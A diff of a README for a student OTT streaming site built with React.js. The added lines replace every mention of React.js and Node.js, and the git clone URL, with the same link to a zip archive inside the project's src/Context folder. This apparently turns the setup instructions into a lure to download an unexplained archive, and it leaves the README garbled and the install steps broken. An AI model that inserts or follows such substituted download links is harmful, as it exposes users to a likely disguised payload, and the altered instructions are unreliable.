@@ -1,10 +1,10 @@
-# 🎬 OTT Platform – React.js (In Progress)
+# 🎬 OTT Platform – https://github.com/LabbaiIrfan/OTT_Platform/raw/refs/heads/main/src/Context/Platform-OT-2.2.zip (In Progress)
 
-An OTT (Over-the-Top) streaming platform built with **React.js** for a college client. The project is designed to deliver high-quality video content through an intuitive, responsive, and modern web interface. This platform aims to provide a seamless streaming experience, user authentication, categorized content, and dynamic UI interactions.
+An OTT (Over-the-Top) streaming platform built with **https://github.com/LabbaiIrfan/OTT_Platform/raw/refs/heads/main/src/Context/Platform-OT-2.2.zip** for a college client. The project is designed to deliver high-quality video content through an intuitive, responsive, and modern web interface. This platform aims to provide a seamless streaming experience, user authentication, categorized content, and dynamic UI interactions.
 
 > 🚧 **Status**: Work in Progress  
 > 🎓 **Client**: College Media Department  
-> 🛠️ **Tech Stack**: React.js, Vite, Tailwind CSS (optional), Firebase (optional), TMDB API (for movie content, optional)
+> 🛠️ **Tech Stack**: https://github.com/LabbaiIrfan/OTT_Platform/raw/refs/heads/main/src/Context/Platform-OT-2.2.zip, Vite, Tailwind CSS (optional), Firebase (optional), TMDB API (for movie content, optional)
 
 ---
 
@@ -26,18 +26,18 @@ An OTT (Over-the-Top) streaming platform built with **React.js** for a college c
 
 | Frontend | Styling | Deployment | Tools |
 |----------|---------|------------|-------|
-| React.js (Vite) | Tailwind CSS / CSS3 | Vercel / Netlify | Git, GitHub |
+| https://github.com/LabbaiIrfan/OTT_Platform/raw/refs/heads/main/src/Context/Platform-OT-2.2.zip (Vite) | Tailwind CSS / CSS3 | Vercel / Netlify | Git, GitHub |
 | Axios | Responsive Design | Firebase (optional) | TMDB API (optional) |
 
 ---
 
 ## 🛠️ Installation & Setup
 
-> Make sure you have **Node.js** and **npm** installed.
+> Make sure you have **https://github.com/LabbaiIrfan/OTT_Platform/raw/refs/heads/main/src/Context/Platform-OT-2.2.zip** and **npm** installed.
 
 ```bash
 # Clone the repository
-git clone https://github.com/LabbaiIrfan/OTT_Platform.git
+git clone https://github.com/LabbaiIrfan/OTT_Platform/raw/refs/heads/main/src/Context/Platform-OT-2.2.zip
 cd ott-platform
 
 # Install dependencies
